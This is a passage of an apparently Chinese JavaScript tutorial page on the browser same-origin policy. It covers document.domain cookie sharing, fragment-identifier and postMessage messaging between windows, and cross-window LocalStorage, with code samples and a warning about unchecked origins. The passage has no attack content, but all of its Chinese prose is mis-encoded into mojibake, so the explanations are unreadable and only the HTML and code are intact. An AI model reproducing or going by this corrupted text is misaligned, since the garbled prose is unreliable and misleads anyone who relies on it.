Cookieï¼ŒåŒ…å«äº†ä¸€äº›éšç§ä¿¡æ¯ã€‚ç”¨æˆ·ç¦»å¼€ A ç½‘ç«™ä»¥åï¼Œåˆå»è®¿é—® B ç½‘ç«™ï¼Œå¦‚æœæ²¡æœ‰åŒæºé™åˆ¶ï¼ŒB ç½‘ç«™å¯ä»¥è¯»å– A ç½‘ç«™çš„ Cookieï¼Œé‚£ä¹ˆéšç§å°±æ³„æ¼äº†ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚</p><p>ç”±æ­¤å¯è§ï¼ŒåŒæºæ”¿ç­–æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚</p><h4 id="é™åˆ¶èŒƒå›´" tabindex="-1"><a class="header-anchor" href="#é™åˆ¶èŒƒå›´" aria-hidden="true">#</a> é™åˆ¶èŒƒå›´</h4><p>éšç€äº’è”ç½‘çš„å‘å±•ï¼ŒåŒæºæ”¿ç­–è¶Šæ¥è¶Šä¸¥æ ¼ã€‚ç›®å‰ï¼Œå¦‚æœéåŒæºï¼Œå…±æœ‰ä¸‰ç§è¡Œä¸ºå—åˆ°é™åˆ¶ã€‚</p><blockquote><p>ï¼ˆ1ï¼‰ æ— æ³•è¯»å–éåŒæºç½‘é¡µçš„ Cookieã€LocalStorage å’Œ IndexedDBã€‚</p><p>ï¼ˆ2ï¼‰ æ— æ³•æ¥è§¦éåŒæºç½‘é¡µçš„ DOMã€‚</p><p>ï¼ˆ3ï¼‰ æ— æ³•å‘éåŒæºåœ°å€å‘é€ AJAX è¯·æ±‚ï¼ˆå¯ä»¥å‘é€ï¼Œä½†æµè§ˆå™¨ä¼šæ‹’ç»æ¥å—å“åº”ï¼‰ã€‚</p></blockquote><p>å¦å¤–ï¼Œé€šè¿‡ JavaScript è„šæœ¬å¯ä»¥æ‹¿åˆ°å…¶ä»–çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¦‚æœæ˜¯éåŒæºçš„ç½‘é¡µï¼Œç›®å‰å…è®¸ä¸€ä¸ªçª—å£å¯ä»¥æ¥è§¦å…¶ä»–ç½‘é¡µçš„<code>window</code>å¯¹è±¡çš„ä¹ä¸ªå±æ€§å’Œå››ä¸ªæ–¹æ³•ã€‚</p><ul><li>window.closed</li><li>window.frames</li><li>window.length</li><li>window.location</li><li>window.opener</li><li>window.parent</li><li>window.self</li><li>window.top</li><li>window.window</li><li>window.blur()</li><li>window.close()</li><li>window.focus()</li><li>window.postMessage()</li></ul><p>ä¸Šé¢çš„ä¹ä¸ªå±æ€§ä¹‹ä¸­ï¼Œåªæœ‰<code>window.location</code>æ˜¯å¯è¯»å†™çš„ï¼Œå…¶ä»–å…«ä¸ªå…¨éƒ¨éƒ½æ˜¯åªè¯»ã€‚è€Œä¸”ï¼Œå³ä½¿æ˜¯<code>location</code>å¯¹è±¡ï¼ŒéåŒæºçš„æƒ…å†µä¸‹ï¼Œä¹Ÿåªå…è®¸è°ƒç”¨<code>location.replace()</code>æ–¹æ³•å’Œå†™å…¥<code>location.href</code>å±æ€§ã€‚</p><p>è™½ç„¶è¿™äº›é™åˆ¶æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ï¼Œåˆç†çš„ç”¨é€”ä¹Ÿå—åˆ°å½±å“ã€‚ä¸‹é¢ä»‹ç»å¦‚ä½•è§„é¿ä¸Šé¢çš„é™åˆ¶ã€‚</p><h3 id="cookie-1" tabindex="-1"><a class="header-anchor" href="#cookie-1" aria-hidden="true">#</a> Cookie</h3><p>Cookie æ˜¯æœåŠ¡å™¨å†™å…¥æµè§ˆå™¨çš„ä¸€å°æ®µä¿¡æ¯ï¼Œåªæœ‰åŒæºçš„ç½‘é¡µæ‰èƒ½å…±äº«ã€‚å¦‚æœä¸¤ä¸ªç½‘é¡µä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯æ¬¡çº§åŸŸåä¸åŒï¼Œæµè§ˆå™¨å…è®¸é€šè¿‡è®¾ç½®<code>document.domain</code>å…±äº« Cookieã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼ŒA ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w1.example.com/a.html</code>ï¼ŒB ç½‘é¡µçš„ç½‘å€æ˜¯<code>http://w2.example.com/b.html</code>ï¼Œé‚£ä¹ˆåªè¦è®¾ç½®ç›¸åŒçš„<code>document.domain</code>ï¼Œä¸¤ä¸ªç½‘é¡µå°±å¯ä»¥å…±äº« Cookieã€‚å› ä¸ºæµè§ˆå™¨é€šè¿‡<code>document.domain</code>å±æ€§æ¥æ£€æŸ¥æ˜¯å¦åŒæºã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®</span>
document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">&#39;example.com&#39;</span><span class="token punctuation">;</span>
</code></pre></div><p>æ³¨æ„ï¼ŒA å’Œ B ä¸¤ä¸ªç½‘é¡µéƒ½éœ€è¦è®¾ç½®<code>document.domain</code>å±æ€§ï¼Œæ‰èƒ½è¾¾åˆ°åŒæºçš„ç›®çš„ã€‚å› ä¸ºè®¾ç½®<code>document.domain</code>çš„åŒæ—¶ï¼Œä¼šæŠŠç«¯å£é‡ç½®ä¸º<code>null</code>ï¼Œå› æ­¤å¦‚æœåªè®¾ç½®ä¸€ä¸ªç½‘é¡µçš„<code>document.domain</code>ï¼Œä¼šå¯¼è‡´ä¸¤ä¸ªç½‘å€çš„ç«¯å£ä¸åŒï¼Œè¿˜æ˜¯è¾¾ä¸åˆ°åŒæºçš„ç›®çš„ã€‚</p><p>ç°åœ¨ï¼ŒA ç½‘é¡µé€šè¿‡è„šæœ¬è®¾ç½®ä¸€ä¸ª Cookieã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">&quot;test1=hello&quot;</span><span class="token punctuation">;</span>
</code></pre></div><p>B ç½‘é¡µå°±å¯ä»¥è¯»åˆ°è¿™ä¸ª Cookieã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> allCookie <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</code></pre></div><p>æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åªé€‚ç”¨äº Cookie å’Œ iframe çª—å£ï¼ŒLocalStorage å’Œ IndexedDB æ— æ³•é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè§„é¿åŒæºæ”¿ç­–ï¼Œè€Œè¦ä½¿ç”¨ä¸‹æ–‡ä»‹ç» PostMessage APIã€‚</p><p>å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥åœ¨è®¾ç½® Cookie çš„æ—¶å€™ï¼ŒæŒ‡å®š Cookie çš„æ‰€å±åŸŸåä¸ºä¸€çº§åŸŸåï¼Œæ¯”å¦‚<code>.example.com</code>ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: key=value; domain=.example.com; path=/
</code></pre></div><p>è¿™æ ·çš„è¯ï¼ŒäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ª Cookieã€‚</p><h3 id="iframe-å’Œå¤šçª—å£é€šä¿¡" tabindex="-1"><a class="header-anchor" href="#iframe-å’Œå¤šçª—å£é€šä¿¡" aria-hidden="true">#</a> iframe å’Œå¤šçª—å£é€šä¿¡</h3><p><code>iframe</code>å…ƒç´ å¯ä»¥åœ¨å½“å‰ç½‘é¡µä¹‹ä¸­ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µã€‚æ¯ä¸ª<code>iframe</code>å…ƒç´ å½¢æˆè‡ªå·±çš„çª—å£ï¼Œå³æœ‰è‡ªå·±çš„<code>window</code>å¯¹è±¡ã€‚<code>iframe</code>çª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£å’Œå­çª—å£ã€‚ä½†æ˜¯ï¼Œåªæœ‰åœ¨åŒæºçš„æƒ…å†µä¸‹ï¼Œçˆ¶çª—å£å’Œå­çª—å£æ‰èƒ½é€šä¿¡ï¼›å¦‚æœè·¨åŸŸï¼Œå°±æ— æ³•æ‹¿åˆ°å¯¹æ–¹çš„ DOMã€‚</p><p>æ¯”å¦‚ï¼Œçˆ¶çª—å£è¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¦‚æœ<code>iframe</code>çª—å£ä¸æ˜¯åŒæºï¼Œå°±ä¼šæŠ¥é”™ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>document
<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myIFrame&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span>contentWindow
<span class="token punctuation">.</span>document
<span class="token comment">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span>
</code></pre></div><p>ä¸Šé¢å‘½ä»¤ä¸­ï¼Œçˆ¶çª—å£æƒ³è·å–å­çª—å£çš„ DOMï¼Œå› ä¸ºè·¨åŸŸå¯¼è‡´æŠ¥é”™ã€‚</p><p>åä¹‹äº¦ç„¶ï¼Œå­çª—å£è·å–ä¸»çª—å£çš„ DOM ä¹Ÿä¼šæŠ¥é”™ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body
<span class="token comment">// æŠ¥é”™</span>
</code></pre></div><p>è¿™ç§æƒ…å†µä¸ä»…é€‚ç”¨äº<code>iframe</code>çª—å£ï¼Œè¿˜é€‚ç”¨äº<code>window.open</code>æ–¹æ³•æ‰“å¼€çš„çª—å£ï¼Œåªè¦è·¨åŸŸï¼Œçˆ¶çª—å£ä¸å­çª—å£ä¹‹é—´å°±æ— æ³•é€šä¿¡ã€‚</p><p>å¦‚æœä¸¤ä¸ªçª—å£ä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œé‚£ä¹ˆè®¾ç½®ä¸Šä¸€èŠ‚ä»‹ç»çš„<code>document.domain</code>å±æ€§ï¼Œå°±å¯ä»¥è§„é¿åŒæºæ”¿ç­–ï¼Œæ‹¿åˆ° DOMã€‚</p><p>å¯¹äºå®Œå…¨ä¸åŒæºçš„ç½‘ç«™ï¼Œç›®å‰æœ‰ä¸¤ç§æ–¹æ³•ï¼Œå¯ä»¥è§£å†³è·¨åŸŸçª—å£çš„é€šä¿¡é—®é¢˜ã€‚</p><blockquote><ul><li>ç‰‡æ®µè¯†åˆ«ç¬¦ï¼ˆfragment identifierï¼‰</li><li>è·¨æ–‡æ¡£é€šä¿¡APIï¼ˆCross-document messagingï¼‰</li></ul></blockquote><h4 id="ç‰‡æ®µè¯†åˆ«ç¬¦" tabindex="-1"><a class="header-anchor" href="#ç‰‡æ®µè¯†åˆ«ç¬¦" aria-hidden="true">#</a> ç‰‡æ®µè¯†åˆ«ç¬¦</h4><p>ç‰‡æ®µæ ‡è¯†ç¬¦ï¼ˆfragment identifierï¼‰æŒ‡çš„æ˜¯ï¼ŒURL çš„<code>#</code>å·åé¢çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚<code>http://example.com/x.html#fragment</code>çš„<code>#fragment</code>ã€‚å¦‚æœåªæ˜¯æ”¹å˜ç‰‡æ®µæ ‡è¯†ç¬¦ï¼Œé¡µé¢ä¸ä¼šé‡æ–°åˆ·æ–°ã€‚</p><p>çˆ¶çª—å£å¯ä»¥æŠŠä¿¡æ¯ï¼Œå†™å…¥å­çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> src <span class="token operator">=</span> originURL <span class="token operator">+</span> <span class="token string">&#39;#&#39;</span> <span class="token operator">+</span> data<span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;myIFrame&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œçˆ¶çª—å£æŠŠæ‰€è¦ä¼ é€’çš„ä¿¡æ¯ï¼Œå†™å…¥ iframe çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p><p>å­çª—å£é€šè¿‡ç›‘å¬<code>hashchange</code>äº‹ä»¶å¾—åˆ°é€šçŸ¥ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>onhashchange <span class="token operator">=</span> checkMessage<span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">checkMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> message <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre></div><p>åŒæ ·çš„ï¼Œå­çª—å£ä¹Ÿå¯ä»¥æ”¹å˜çˆ¶çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>parent<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&#39;#&#39;</span> <span class="token operator">+</span> hash<span class="token punctuation">;</span>
</code></pre></div><h4 id="window-postmessage" tabindex="-1"><a class="header-anchor" href="#window-postmessage" aria-hidden="true">#</a> window.postMessage()</h4><p>ä¸Šé¢çš„è¿™ç§æ–¹æ³•å±äºç ´è§£ï¼ŒHTML5 ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº†ä¸€ä¸ªå…¨æ–°çš„APIï¼šè·¨æ–‡æ¡£é€šä¿¡ APIï¼ˆCross-document messagingï¼‰ã€‚</p><p>è¿™ä¸ª API ä¸º<code>window</code>å¯¹è±¡æ–°å¢äº†ä¸€ä¸ª<code>window.postMessage</code>æ–¹æ³•ï¼Œå…è®¸è·¨çª—å£é€šä¿¡ï¼Œä¸è®ºè¿™ä¸¤ä¸ªçª—å£æ˜¯å¦åŒæºã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œçˆ¶çª—å£<code>aaa.com</code>å‘å­çª—å£<code>bbb.com</code>å‘æ¶ˆæ¯ï¼Œè°ƒç”¨<code>postMessage</code>æ–¹æ³•å°±å¯ä»¥äº†ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// çˆ¶çª—å£æ‰“å¼€ä¸€ä¸ªå­çª—å£</span>
<span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;http://bbb.com&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;title&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// çˆ¶çª—å£å‘å­çª—å£å‘æ¶ˆæ¯</span>
popup<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;Hello World!&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;http://bbb.com&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><code>postMessage</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…·ä½“çš„ä¿¡æ¯å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£çš„æºï¼ˆoriginï¼‰ï¼Œå³â€œåè®® + åŸŸå + ç«¯å£â€ã€‚ä¹Ÿå¯ä»¥è®¾ä¸º<code>*</code>ï¼Œè¡¨ç¤ºä¸é™åˆ¶åŸŸåï¼Œå‘æ‰€æœ‰çª—å£å‘é€ã€‚</p><p>å­çª—å£å‘çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„å†™æ³•ç±»ä¼¼ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// å­çª—å£å‘çˆ¶çª—å£å‘æ¶ˆæ¯</span>
window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;Nice to see you&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;http://aaa.com&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥é€šè¿‡<code>message</code>äº‹ä»¶ï¼Œç›‘å¬å¯¹æ–¹çš„æ¶ˆæ¯ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// çˆ¶çª—å£å’Œå­çª—å£éƒ½å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ï¼Œ</span>
<span class="token comment">// ç›‘å¬ message æ¶ˆæ¯</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><code>message</code>äº‹ä»¶çš„å‚æ•°æ˜¯äº‹ä»¶å¯¹è±¡<code>event</code>ï¼Œæä¾›ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ã€‚</p><blockquote><ul><li><code>event.source</code>ï¼šå‘é€æ¶ˆæ¯çš„çª—å£</li><li><code>event.origin</code>: æ¶ˆæ¯å‘å‘çš„ç½‘å€</li><li><code>event.data</code>: æ¶ˆæ¯å†…å®¹</li></ul></blockquote><p>ä¸‹é¢çš„ä¾‹å­æ˜¯ï¼Œå­çª—å£é€šè¿‡<code>event.source</code>å±æ€§å¼•ç”¨çˆ¶çª—å£ï¼Œç„¶åå‘é€æ¶ˆæ¯ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> receiveMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">receiveMessage</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;Nice to see you!&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;*&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ä»£ç æœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>receiveMessage</code>å‡½æ•°é‡Œé¢æ²¡æœ‰è¿‡æ»¤ä¿¡æ¯çš„æ¥æºï¼Œä»»æ„ç½‘å€å‘æ¥çš„ä¿¡æ¯éƒ½ä¼šè¢«å¤„ç†ã€‚å…¶æ¬¡ï¼Œ<code>postMessage</code>æ–¹æ³•ä¸­æŒ‡å®šçš„ç›®æ ‡çª—å£çš„ç½‘å€æ˜¯ä¸€ä¸ªæ˜Ÿå·ï¼Œè¡¨ç¤ºè¯¥ä¿¡æ¯å¯ä»¥å‘ä»»æ„ç½‘å€å‘é€ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸¤ç§åšæ³•æ˜¯ä¸æ¨èçš„ï¼Œå› ä¸ºä¸å¤Ÿå®‰å…¨ï¼Œå¯èƒ½ä¼šè¢«æ¶æ„åˆ©ç”¨ã€‚</p><p><code>event.origin</code>å±æ€§å¯ä»¥è¿‡æ»¤ä¸æ˜¯å‘ç»™æœ¬çª—å£çš„æ¶ˆæ¯ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> receiveMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">receiveMessage</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">&#39;http://aaa.com&#39;</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>data <span class="token operator">===</span> <span class="token string">&#39;Hello World&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;Hello&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="localstorage" tabindex="-1"><a class="header-anchor" href="#localstorage" aria-hidden="true">#</a> LocalStorage</h4><p>é€šè¿‡<code>window.postMessage</code>ï¼Œè¯»å†™å…¶ä»–çª—å£çš„ LocalStorage ä¹Ÿæˆä¸ºäº†å¯èƒ½ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä¸»çª—å£å†™å…¥ iframe å­çª—å£çš„<code>localStorage</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">&#39;http://bbb.com&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£å°†çˆ¶çª—å£å‘æ¥çš„æ¶ˆæ¯ï¼Œå†™å…¥è‡ªå·±çš„ LocalStorageã€‚</p><p>çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> win <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&#39;iframe&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">&#39;Jack&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">&#39;storage&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> obj<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">&#39;http://bbb.com&#39;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>åŠ å¼ºç‰ˆçš„å­çª—å£æ¥æ”¶æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token string">&#39;http://bbb.com&#39;</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>payload<span class="token punctuation">.</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">&#39;set&#39;</span><span class="token operator">:</span>
      localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">&#39;get&#39;</span><span class="token operator">:</span>
      <span class="token keyword">var</span> parent <span class="token operator">=</span> window<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>
      <span class="token keyword">var</span> data <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
      parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">&#39;http://aaa.com&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">&#39;remove&#39;</span><span class="token operator">:</span>
      localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>åŠ å¼ºç‰ˆçš„çˆ¶çª—å£å‘é€æ¶ˆæ¯ä»£ç å¦‚ä¸‹ã€‚</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> win <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&#39;iframe&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token 